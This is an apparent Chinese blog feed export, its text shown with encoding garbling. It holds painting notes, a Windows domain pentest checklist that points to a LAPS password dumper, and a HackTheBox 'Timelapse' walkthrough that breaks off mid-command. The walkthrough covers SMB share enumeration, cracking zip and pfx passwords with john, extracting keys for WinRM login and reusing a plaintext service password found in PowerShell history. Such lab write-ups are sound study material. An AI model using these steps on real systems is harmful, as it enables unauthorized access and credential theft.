        <content type="html"><![CDATA[<h2 id="é˜´å½±æ»šåŠ¨æ¡"><a href="#é˜´å½±æ»šåŠ¨æ¡" class="headerlink" title="é˜´å½±æ»šåŠ¨æ¡"></a>é˜´å½±æ»šåŠ¨æ¡</h2><ul><li><a href="https://www.bilibili.com/video/BV1KK4y1G77Z">video</a></li></ul><p>åœ¨è§‚å¯Ÿä¸€å¹…ç”»çš„æ—¶å€™ï¼Œå¯ä»¥å»å…³æ³¨ä»–çš„é˜´å½±ï¼Œç”»é¢é˜´å½±å¯ä»¥ç”¨ä¸‰ä¸ªå€¼æ¥è¡¨è¾¾ï¼š</p><ul><li><strong>é¢ç§¯</strong> é˜´å½±è¦†ç›–çš„é¢ç§¯ï¼Œé˜´å½±é¢ç§¯è¶Šå°ï¼Œä»£è¡¨è¶Šæƒ³å»è¡¨è¾¾æœ¬ä½“ï¼Œè¶Šå¤§ä»£è¡¨è¶Šæƒ³å»è¡¨è¾¾æƒ…ç»ªã€‚</li><li><strong>æ˜åº¦</strong> é˜´å½±çš„æ˜åº¦è¶Šä½ï¼Œé¢œè‰²è¶Šæ·±ï¼Œè¶Šéš¾è¢«çœ‹æ¸…ã€‚å¯ä»¥å°†å…¶ç†è§£ä¸ºä¿®è¾ï¼Œè¶Šå°è¶Šç›´ç™½ï¼Œè¶Šå¤§è¶Šå§”å©‰ï¼Œæ„Ÿæƒ…è¶Šç»†è…»ã€‚</li><li><strong>ç¡¬åº¦</strong> ç¡¬åº¦è¶Šå°è¶ŠæŸ”å’Œï¼Œè¶Šå¤§è¾¹ç¼˜è¶Šæ¸…æ™°ã€‚å¯ä»¥ç†è§£ä¸ºè¯­æ°”ï¼Œè¶Šå°å´å¼ºçƒˆã€‚</li></ul><p><img src="/2022/04/23/%E7%BB%98%E7%94%BB%E7%AC%94%E8%AE%B0/1.png"></p><h2 id="é•¿æœŸè‰²å½©"><a href="#é•¿æœŸè‰²å½©" class="headerlink" title="é•¿æœŸè‰²å½©"></a>é•¿æœŸè‰²å½©</h2><ul><li><a href="https://www.bilibili.com/video/BV1yv41157KC">video</a></li></ul><p>é•¿æœŸè‰²å½©åŸ¹å…»çš„æ˜¯ä¸€ä¸ªè‰²å½©å…³ç³»ï¼Œåœ¨ä¸´æ‘¹çš„æ—¶å€™ï¼Œä¸è¦å®Œå…¨ç…§æ¬é¢œè‰²ï¼Œè€Œæ˜¯åº”è¯¥æ ¹æ®è‡ªå·±å®šçš„åŸºè°ƒæ¨å‡ºé¢œè‰²ã€‚</p><p><img src="/2022/04/23/%E7%BB%98%E7%94%BB%E7%AC%94%E8%AE%B0/2.png"></p><p>å¦‚ä¸Šå›¾ï¼Œå› ä¸ºåœ¨å®šå¤©ç©ºçš„é¢œè‰²æ—¶å€™ç¨å¾®äº®äº†ä¸€äº›ï¼Œæ‰€ä»¥æ‰€æœ‰çš„é¢œè‰²æ¨å¯¼éƒ½ä¼šäº®ä¸€äº›ã€‚</p><h2 id="ä¸»è§‚é¢œè‰²"><a href="#ä¸»è§‚é¢œè‰²" class="headerlink" title="ä¸»è§‚é¢œè‰²"></a>ä¸»è§‚é¢œè‰²</h2><ul><li><a href="https://www.bilibili.com/video/BV1qv411p7kK">video</a></li></ul><p>ä¸»è§‚é¢œè‰²æ˜¯è¦å°†éœ€è¦å¼ºè°ƒçš„é¢œè‰²é€šè¿‡å†·æš–å¯¹æ’å®Œå…¨è„±ç¦»å‡ºæ¥ã€‚</p><p><img src="/2022/04/23/%E7%BB%98%E7%94%BB%E7%AC%94%E8%AE%B0/3.png"></p><h2 id="å…³äºç»˜ç”»å®Œæ•´è¿‡ç¨‹çš„é˜¶æ®µ"><a href="#å…³äºç»˜ç”»å®Œæ•´è¿‡ç¨‹çš„é˜¶æ®µ" class="headerlink" title="å…³äºç»˜ç”»å®Œæ•´è¿‡ç¨‹çš„é˜¶æ®µ"></a>å…³äºç»˜ç”»å®Œæ•´è¿‡ç¨‹çš„é˜¶æ®µ</h2><p>åˆ†ä¸ºå…«ä¸ªé˜¶æ®µï¼š</p><ol><li>è½®å»“ - é€šè¿‡å‰ªå½±è¡¨è¾¾æ•ˆæœï¼Œè¿™æ—¶å€™å°±æ˜¯è¦å¤šè®¾è®¡ç¬¬ä¸€å°è±¡çš„é€ å‹</li><li>åˆ†å‰² - å°†å¤–è½®å»“åˆ†å‰²æˆç»“æ„ï¼Œç¡®å®šç©¿æ’å…³ç³»</li><li>è‰å›¾ - ç¡®å®šç»†èŠ‚</li><li>çº¿ç¨¿ - å®Œæˆçº¿æ¡è®¾è®¡</li><li>ç«‹ä½“ - é»‘ç™½å…³ç³»ï¼Œæœ€å¥½ä¸è¦å¸¦å›ºæœ‰è‰²ï¼ˆæˆ–è€…è¯´è´¨æ„Ÿï¼‰</li><li>é…è‰² - ä½¿ç”¨çº¯è‰²è’™ç‰ˆï¼Œå¯ä»¥å¿«é€Ÿæ”¹å˜é…è‰²</li><li>å¡‘é€  - åŠ å¼ºæè´¨è´¨æ„Ÿ</li><li>å®Œç¨¿ - æ”¶çº¿</li></ol><p>åœ¨ä¹ æƒ¯äº†è¿™ä¸ªæµç¨‹åå°±å¯ä»¥å¯¹æµç¨‹è¿›è¡Œåˆå¹¶äº†</p><h2 id="é¢œè‰²å åŠ çš„å‡ ç‚¹"><a href="#é¢œè‰²å åŠ çš„å‡ ç‚¹" class="headerlink" title="é¢œè‰²å åŠ çš„å‡ ç‚¹"></a>é¢œè‰²å åŠ çš„å‡ ç‚¹</h2><ul><li><a href="https://www.bilibili.com/video/BV1UT4y1B7JW">video</a></li></ul><p>å è‰²çš„æŠ€å·§ï¼š</p><ol><li>ä½¿ç”¨çº¯è‰²è’™ç‰ˆï¼Œæ–¹ä¾¿æ”¹è‰²</li><li>ä½¿ç”¨ç»„è¿›è¡Œå›¾å±‚ç±»å‹é€‰æ‹©ï¼Œè¿™æ ·ç»„é‡Œé¢çš„å›¾å±‚æ˜¯æ­£å¸¸é®ç›–å…³ç³»</li><li>ä»å¤§åˆ°å°è¿›è¡Œå è‰²</li><li>é¦–å…ˆå®šä¸»åŸºè°ƒçš„å†·æš–å’Œç”¨æ¸å˜å®šå¯¹æ¯”è‰²</li><li>ä¸è¦ç™¾åˆ†ç™¾å…¨å è‰²ï¼Œç•™ç©ºï¼Œæœ‰åº•ä¸‹çš„é¢œè‰²é€ä¸Šæ¥ï¼Œé¢œè‰²å°±ä¼šä¸°å¯Œã€‚ï¼ˆæ’’æ±¤æ¼æ°´ï¼‰</li></ol><ul><li>æ­£ç‰‡å åº• åšé˜´å½±</li><li>é¢œè‰²å‡æ·¡å’Œçº¿æ€§å‡æ·¡ åšå…‰çº¿</li><li>å åŠ å’ŒæŸ”å…‰æ˜¯å›ºæœ‰è‰²ä¸Šè‰²æ–¹å¼</li><li>å¼ºå…‰åšä¸­ç°ï¼Œä¸­æš—éƒ¨åˆ†</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€æ¸…å•</title>
      <link href="/2022/04/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/"/>
      <url>/2022/04/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸŸæ¸—é€çš„é€šå¸¸æ€è·¯"><a href="#åŸŸæ¸—é€çš„é€šå¸¸æ€è·¯" class="headerlink" title="åŸŸæ¸—é€çš„é€šå¸¸æ€è·¯"></a>åŸŸæ¸—é€çš„é€šå¸¸æ€è·¯</h2><p>åœ¨ä¸€ä¸ªä¼ä¸šä¸­ï¼Œä½¿ç”¨åŸŸæ¥è¿›è¡Œç®¡ç†ï¼Œåœ¨è£…æœºçš„æ—¶å€™å¾€å¾€éƒ½æ˜¯ä½¿ç”¨çš„é•œåƒç£ç›˜æ¥è¿›è¡Œçš„ï¼Œæ‰€ä»¥ä¹Ÿå°±ç”¨åˆ°äº†ç»Ÿä¸€çš„ç®¡ç†å‘˜å¯†ç ï¼Œè¿™ä¸ªå¯†ç æ˜¯å¾ˆå°‘æœ‰æœºä¼šæ”¹å˜çš„ã€‚å½“çŸ¥é“äº†ä¸€å°è®¾å¤‡çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå¾€å¾€ä¹Ÿå°±æ„å‘³ç€å¤§éƒ¨åˆ†è®¾å¤‡éƒ½å¯ç”¨ç™»å½•äº†ã€‚</p><p>å…¶æ¬¡åŸŸç®¡ç†å‘˜è¦ç™»å½•åˆ°æŸä¸ªåŸŸå†…è®¡ç®—æœºä¸Šï¼Œå½“ä½¿ç”¨è¿‡åŸŸç®¡ç†å‘˜å¯†ç åï¼Œwindowsæ˜¯ä¼šè¿›è¡Œè®°å½•å¹¶ä¸”ä¿å­˜çš„ï¼Œè¿™ä¸ªå¯†ç çš„Hashæ˜¯å¯ç”¨è¢«å·¥å…·ä»è¿›ç¨‹ä¸­æå–å‡ºæ¥å¹¶ä¸”å……å½“è®¤è¯çš„å‡­è¯çš„ã€‚</p><p>å½“ç„¶ï¼Œä¸ºäº†å¯¹æŠ—è¿™ç§é£é™©ï¼Œwindowsä¹Ÿæœ‰ç›¸åº”çš„æªæ–½ï¼Œä¹Ÿå°±æ˜¯LAPSï¼Œé€šè¿‡éšæœºç”Ÿæˆæœ¬åœ°ç®¡ç†å‘˜çš„å¯†ç ï¼ŒLAPSå¯ä»¥æœ‰æ•ˆæ¶ˆé™¤æ¨ªå‘æ¸—é€æ‰€å¸¦æ¥çš„å®‰å…¨é£é™©ã€‚<br>å½“ç„¶è¿™ä¸ªä¹Ÿæ˜¯å¯ç”¨è¢«dumpå‡ºæ¥çš„ã€‚</p><h2 id="æ¸…å•"><a href="#æ¸…å•" class="headerlink" title="æ¸…å•"></a>æ¸…å•</h2><ul><li><input disabled="" type="checkbox"> æšä¸¾åŸŸç›¸å…³çš„ä¿¡æ¯ï¼Œæ”¶é›†åŸŸæ§IPï¼ŒåŸŸæˆå‘˜ï¼Œç®¡ç†å‘˜ç­‰</li><li><input disabled="" type="checkbox"> æ£€æŸ¥æ˜¯å¦æœ‰LAPSï¼Œå¦‚æœæœ‰ï¼Œåˆ™ä½¿ç”¨<a href="https://github.com/n00py/LAPSDumper/blob/main/laps.py">laps.py</a>æ¥è¿›è¡Œdumpéšæœºå¯†ç ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> checklist </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB timlapse writeup</title>
      <link href="/2022/04/20/HTB-timlapse-writeup/"/>
      <url>/2022/04/20/HTB-timlapse-writeup/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">IP</th><th align="center">ROLE</th><th align="center">OS</th></tr></thead><tbody><tr><td align="center">10.10.11.152</td><td align="center">Victim</td><td align="center">Windows</td></tr><tr><td align="center">10.10.14.7</td><td align="center">Attacker</td><td align="center">Kali</td></tr></tbody></table><blockquote><p>å¦‚æœä½ æ˜¯åœ¨æ‰¾writeupè€Œçœ‹çš„è¿™ç¯‡æ–‡ç« ï¼Œé‚£ä¹ˆè¯·å†åšæŒä¸€ä¸‹ã€‚è¿™é‡Œç»™ä¸€ç‚¹æç¤º:</p><ol><li>éœ€è¦ç”¨åˆ°æš´åŠ›ç ´è§£ï¼Œä½†å¾ˆç®€å•</li><li>äº†è§£lapsçš„å¯†ç è·å–æ–¹æ³•</li></ol></blockquote><p>å‘½ä»¤å‚è€ƒäº†<a href="https://github.com/Elinpf/cmder">cmder</a>å·¥å…·ä¸­çš„å‘½ä»¤ã€‚</p><h2 id="è·å–æ™®é€šæƒé™"><a href="#è·å–æ™®é€šæƒé™" class="headerlink" title="è·å–æ™®é€šæƒé™"></a>è·å–æ™®é€šæƒé™</h2><p>é¦–å…ˆè¿›è¡Œç«¯å£æ‰«æ</p><p>ä½¿ç”¨<code>cmder -p db/pentesting/1_enumeration/0_Nmap.xd</code>æŸ¥çœ‹å¸¸ç”¨nmapå‘½ä»¤ï¼Œé€‰æ‹©å¼€å±€å‘½ä»¤<code>cmder use 1 -do namp_start</code></p><p>å¾—åˆ°æœ‰æ•ˆä¿¡æ¯å¼€æ”¾ç«¯å£å¦‚ä¸‹ï¼š</p><p><img src="/2022/04/20/HTB-timlapse-writeup/1.png"></p><p>æˆ‘ä»¬çŸ¥é“ï¼ŒåŸŸæ§æœåŠ¡å™¨éœ€è¦å¸¸å¼€çš„ç«¯å£æœ‰ï¼š<br>kerberos : 88/TCP 88/UDP<br>LDAP : 389/TCPAK 636/TCP(å¦‚æœä½¿ç”¨ SSL)<br>LDAP ping : 389/UDP<br>DNS : 53/TCP 53/UDP<br>SMB over IP : 445/TCP 445/UDP<br>æ‰€ä»¥å¯ä»¥åˆ¤æ–­å‡ºè¿™å°ä¸»æœºä¸ºåŸŸæ§æœåŠ¡å™¨ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥å›´ç»•å¦‚ä½•è·å–åŸŸæ§ç®¡ç†å‘˜æœ€é«˜æƒé™è¿›è¡Œï¼Œå› ä¸ºæœ‰SMBï¼Œæ‰€ä»¥é¦–å…ˆæšä¸¾SMBç›¸å…³ä¿¡æ¯ã€‚</p><ul><li><a href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/" title="smb æ¸—é€æ¸…å•">smb æ¸—é€æ¸…å•</a></li></ul><p><code>cmder -p db/pentesting/1_enumeration/137_138_139_SMB.xd</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 3</span></span><span class="line">[âœ“] Executing: smbmap -H 10.10.11.152</span><span class="line">[+] IP: 10.10.11.152:445        Name: timelapse.htb</span></code></pre></div></div><p>å¾—åˆ°åŸŸå<code>timelapse.htb</code>, å°†å…¶æ·»åŠ åˆ°æœ¬åœ°DNSè§£æä¸­: <code>echo &#39;10.10.11.152 timelapse.htb&#39; &gt;&gt; /etc/hosts</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 5</span></span><span class="line">[âœ“] Executing: smbclient -N -L //10.10.11.152</span><span class="line"></br></span><span class="line">        Sharename       Type      Comment</span><span class="line">        ---------       ----      -------</span><span class="line">        ADMIN$          Disk      Remote Admin</span><span class="line">        C$              Disk      Default share</span><span class="line">        IPC$            IPC       Remote IPC</span><span class="line">        NETLOGON        Disk      Logon server share</span><span class="line">        Shares          Disk</span><span class="line">        SYSVOL          Disk      Logon server share</span><span class="line">SMB1 disabled -- no workgroup available</span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿä½¿ç”¨åŒ¿åç™»å½•ï¼Œé€ä¸ªæ£€æŸ¥å…±äº«æ–‡ä»¶å¤¹åï¼Œå‘ç°<code>Shares</code>æ–‡ä»¶å¯ä»¥è®¿é—®ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 31</span></span><span class="line">ğŸ¦´ (custom) PWD [Password]:</span><span class="line">[âœ“] Executing: smbmap -R ADMIN$ -H 10.10.11.152 -u guest</span><span class="line">[+] IP: 10.10.11.152:445        Name: timelapse.htb</span><span class="line">        Disk                                                    Permissions     Comment</span><span class="line">        ----                                                    -----------     -------</span><span class="line">        ADMIN$                                                  NO ACCESS</span><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 31</span></span><span class="line">ğŸ¦´ (custom) PWD [Password]:</span><span class="line">[âœ“] Executing: smbmap -R Shares -H 10.10.11.152 -u guest</span><span class="line">[+] IP: 10.10.11.152:445        Name: timelapse.htb</span><span class="line">        Disk                                                    Permissions     Comment</span><span class="line">        ----                                                    -----------     -------</span><span class="line">        Shares                                                  READ ONLY</span><span class="line">        .\Shares\*</span><span class="line">        dr--r--r--                0 Mon Oct 25 15:55:14 2021    .</span><span class="line">        dr--r--r--                0 Mon Oct 25 15:55:14 2021    ..</span><span class="line">        dr--r--r--                0 Mon Oct 25 19:40:06 2021    Dev</span><span class="line">        dr--r--r--                0 Mon Oct 25 15:55:14 2021    HelpDesk</span><span class="line">        .\Shares\Dev\*</span><span class="line">        dr--r--r--                0 Mon Oct 25 19:40:06 2021    .</span><span class="line">        dr--r--r--                0 Mon Oct 25 19:40:06 2021    ..</span><span class="line">        fr--r--r--             2611 Mon Oct 25 21:05:30 2021    winrm_backup.zip</span><span class="line">        .\Shares\HelpDesk\*</span><span class="line">        dr--r--r--                0 Mon Oct 25 15:55:14 2021    .</span><span class="line">        dr--r--r--                0 Mon Oct 25 15:55:14 2021    ..</span><span class="line">        fr--r--r--          1118208 Mon Oct 25 15:55:14 2021    LAPS.x64.msi</span><span class="line">        fr--r--r--           104422 Mon Oct 25 15:55:14 2021    LAPS_Datasheet.docx</span><span class="line">        fr--r--r--           641378 Mon Oct 25 15:55:14 2021    LAPS_OperationsGuide.docx</span><span class="line">        fr--r--r--            72683 Mon Oct 25 15:55:14 2021    LAPS_TechnicalSpecification.docx</span></code></pre></div></div><p>æ³¨æ„åˆ°<code>winrm_backup.zip</code>ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 32</span></span><span class="line">ğŸ¦´ (custom) PWD [Password]:</span><span class="line">[âœ“] Executing: smbmap -H 10.10.11.152 -u guest  --download <span class="hljs-string">&#x27;Shares\Dev\winrm_backup.zip&#x27;</span></span><span class="line">[+] Starting download: Shares\Dev\winrm_backup.zip (2611 bytes)</span><span class="line">[+] File output to: /tmp/box_152/workspace/10.10.11.152-Shares_Dev_winrm_backup.zip</span></code></pre></div></div><p>å½“è§£å‹çš„æ—¶å€™ï¼Œæç¤ºéœ€è¦å¯†ç ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># unzip 10.10.11.152-Shares_Dev_winrm_backup.zip</span></span><span class="line">Archive:  10.10.11.152-Shares_Dev_winrm_backup.zip</span><span class="line">[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:</span><span class="line">   skipping: legacyy_dev_auth.pfx    incorrect password</span></code></pre></div></div><p>é‡Œé¢åŒ…å«äº†<code>legacyy_dev_auth.pfx</code>æ•æ„Ÿæ–‡ä»¶ï¼Œæ˜¯æˆ‘ä»¬éœ€è¦æ”»ç ´çš„ç›®æ ‡ã€‚</p><p>åœ¨æŸ¥çœ‹äº†å…¶ä»–æ–‡ä»¶æ²¡æœ‰åŒ…å«éšè—å¯†ç åï¼Œå°†æ€è·¯è½¬å‘å¯†ç ç ´è§£ã€‚ è¿™é‡Œç”¨åˆ°äº†<code>cmder -p  db/pentesting/2_password_crack/offline_brute_force.xd</code></p><p>åˆ©ç”¨<code>john</code>å·¥å…·è¿›è¡Œç ´è§£ï¼Œé¦–å…ˆéœ€è¦å°†å¸¦ç ´è§£æ–‡ä»¶è½¬æˆhashå€¼ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 2</span></span><span class="line">ğŸ¦´ (custom) file : 10.10.11.152-Shares_Dev_winrm_backup.zip</span><span class="line">[âœ“] Executing: zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip &gt; 10.10.11.152-Shares_Dev_winrm_backup.zip.hash</span><span class="line">ver 2.0 efh 5455 efh 7875 10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa <span class="hljs-built_in">type</span>=8</span></code></pre></div></div><p>ç„¶åæš´åŠ›ç ´è§£</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 5</span></span><span class="line">[âœ“] Executing: john --wordlist=/usr/share/wordlists/rockyou.txt 10.10.11.152-Shares_Dev_winrm_backup.zip.hash</span><span class="line">Using default input encoding: UTF-8</span><span class="line">Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])</span><span class="line">Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="hljs-keyword">for</span> status</span><span class="line">supremelegacy    (10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)</span><span class="line">1g 0:00:00:00 DONE (2022-04-20 02:40) 1.449g/s 5027Kp/s 5027Kc/s 5027KC/s suprgirl..supreme99</span><span class="line">Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><span class="line">Session completed.</span></code></pre></div></div><p>å¾—åˆ°å¯†ç <code>supremelegacy</code>åè¿›è¡Œè§£å‹ï¼Œå¾—åˆ°<code>legacyy_dev_auth.pfx</code>æ–‡ä»¶</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace [80]<span class="hljs-comment"># unzip 10.10.11.152-Shares_Dev_winrm_backup.zip</span></span><span class="line">Archive:  10.10.11.152-Shares_Dev_winrm_backup.zip</span><span class="line">[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:</span><span class="line">  inflating: legacyy_dev_auth.pfx</span></code></pre></div></div><p>pfxæ˜¯å¾®è½¯æ”¯æŒçš„ç§é’¥æ ¼å¼ï¼ŒåŒ…å«äº†å…¬é’¥å’Œç§é’¥çš„äºŒè¿›åˆ¶æ ¼å¼çš„è¯ä¹¦å½¢å¼ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡pfxç”Ÿæˆç§é’¥å’Œå…¬é’¥ã€‚ä½†æ˜¯åœ¨æ­¤ä¹‹å‰éœ€è¦ç ´è§£è¯ä¹¦çš„åŠ å¯†å¯†ç ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 3</span></span><span class="line">ğŸ¦´ (custom) file : legacyy_dev_auth.pfx</span><span class="line">[âœ“] Executing: pfx2john.py legacyy_dev_auth.pfx &gt; legacyy_dev_auth.pfx.hash</span><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># vim legacyy_dev_auth.pfx.hash</span></span><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 5</span></span><span class="line">ğŸ¦´ (custom) hash_file: legacyy_dev_auth.pfx.hash</span><span class="line">[âœ“] Executing: john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash</span><span class="line">Using default input encoding: UTF-8</span><span class="line">Loaded 1 password <span class="hljs-built_in">hash</span> (pfx, (.pfx, .p12) [PKCS<span class="hljs-comment">#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])</span></span><span class="line">Cost 1 (iteration count) is 2000 <span class="hljs-keyword">for</span> all loaded hashes</span><span class="line">Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 <span class="hljs-keyword">for</span> all loaded hashes</span><span class="line">Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="hljs-keyword">for</span> status</span><span class="line">thuglegacy       (legacyy_dev_auth.pfx)</span><span class="line">1g 0:00:01:21 DONE (2022-04-20 03:16) 0.01228g/s 39699p/s 39699c/s 39699C/s thuglife06..thugishxochitl@yahoo.com</span><span class="line">Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><span class="line">Session completed.</span></code></pre></div></div><p>æ³¨æ„åœ¨å¾—åˆ°<code>legacyy_dev_auth.pfx.hash</code>æ–‡ä»¶åï¼Œéœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºå°†<code>b$</code>è¿™æ ·çš„ä¿®æ”¹ä¸º<code>$</code>ï¼ŒåŸå› æ˜¯åœ¨è¾“å‡ºçš„æ—¶å€™è¿˜æ˜¯ä½¿ç”¨çš„btyeæ ¼å¼ã€‚</p><p>æœ€å<code>john</code>ç ´è§£çš„å¯†ç ä¸º<code>thuglegacy</code>ã€‚</p><p>æœ‰äº†pfxæ–‡ä»¶çš„å¯†ç ï¼Œå°±å¯ä»¥å¾—åˆ°ç§é’¥å’Œå…¬é’¥äº†ã€‚ <code>cmder -p db/pentesting/3_cryptography/1_certificates.xd</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 2</span></span><span class="line">[âœ“] Executing: openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -nocerts -nodes -out prv.key</span><span class="line">Enter Import Password:</span><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 3</span></span><span class="line">[âœ“] Executing: openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt</span><span class="line">Enter Import Password:</span><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># ll</span></span><span class="line">total 36K</span><span class="line">-rw-r--r-- 1 root root 2.6K Apr 20 02:31 10.10.11.152-Shares_Dev_winrm_backup.zip</span><span class="line">-rw-r--r-- 1 root root 5.0K Apr 20 02:37 10.10.11.152-Shares_Dev_winrm_backup.zip.hash</span><span class="line">-rw------- 1 root root 1.3K Apr 20 03:21 cert.crt</span><span class="line">-rwxr-xr-x 1 root root 2.5K Oct 25 14:21 legacyy_dev_auth.pfx</span><span class="line">-rw-r--r-- 1 root root 5.0K Apr 20 03:14 legacyy_dev_auth.pfx.hash</span><span class="line">-rw-r--r-- 1 root root 3.7K Apr 20 02:15 nmap_start</span><span class="line">-rw------- 1 root root 2.0K Apr 20 03:21 prv.key</span></code></pre></div></div><p>æœ‰äº†å…¬é’¥å’Œç§é’¥ï¼Œå°±å¯ä»¥æƒ³åŠæ³•è¿›è¡Œç™»å½•äº†ã€‚æ³¨æ„åˆ°å¼€å¯äº†ç«¯å£<code>5986 WinRM</code>æœåŠ¡ï¼Œå¯ä»¥PowerShellç™»å½•ã€‚</p><p><code>cmder -p db/pentesting/1_enumeration/5985_5986_WinRM.xd</code></p><p>å¡«å†™å…¬é’¥å’Œç§é’¥åï¼ŒæˆåŠŸç™»å½•</p><p><img src="/2022/04/20/HTB-timlapse-writeup/2.png"></p><h2 id="è·å–ç®¡ç†å‘˜æƒé™"><a href="#è·å–ç®¡ç†å‘˜æƒé™" class="headerlink" title="è·å–ç®¡ç†å‘˜æƒé™"></a>è·å–ç®¡ç†å‘˜æƒé™</h2><ul><li><a href="/2022/04/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/" title="åŸŸæ¸—é€æ¸…å•">åŸŸæ¸—é€æ¸…å•</a></li></ul><p>è¿™é‡Œæˆ‘é¦–æ¬¡æ£€æŸ¥historyå°±å‘ç°çš„é—®é¢˜</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\legacyy\Desktop&gt; <span class="hljs-built_in">type</span> C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><span class="line">whoami</span><span class="line">ipconfig /all</span><span class="line">netstat -ano |select-string LIST</span><span class="line"><span class="hljs-variable">$so</span> = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck</span><span class="line"><span class="hljs-variable">$p</span> = ConvertTo-SecureString <span class="hljs-string">&#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27;</span> -AsPlainText -Force</span><span class="line"><span class="hljs-variable">$c</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;svc_deploy&#x27;</span>, <span class="hljs-variable">$p</span>)</span><span class="line">invoke-command -computername localhost -credential <span class="hljs-variable">$c</span> -port 5986 -usessl -</span><span class="line">SessionOption <span class="hljs-variable">$so</span> -scriptblock &#123;whoami&#125;</span><span class="line">get-aduser -filter * -properties *</span><span class="line"><span class="hljs-built_in">exit</span></span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°<code>svc_deploy</code>ç”¨æˆ·çš„å¯†ç ä¸º<code>E3R$Q62^12p7PLlC%KWaxuaV</code></p><p>ä½¿ç”¨<code>evil-winrm</code>è¿›è¡Œå¯†ç ç™»å½•<code>evil-winrm -u svc_deploy -p &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;  -i 10.10.11.152 -S</code>.</p><p>æ£€æŸ¥åŸŸç›¸å…³å†…å®¹ã€‚<code>cmder -p  db/windows/CMD_usefull_commands/2_domain.xd</code></p><p>æŸ¥çœ‹æ‰€æœ‰åŸŸè´¦å·</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code 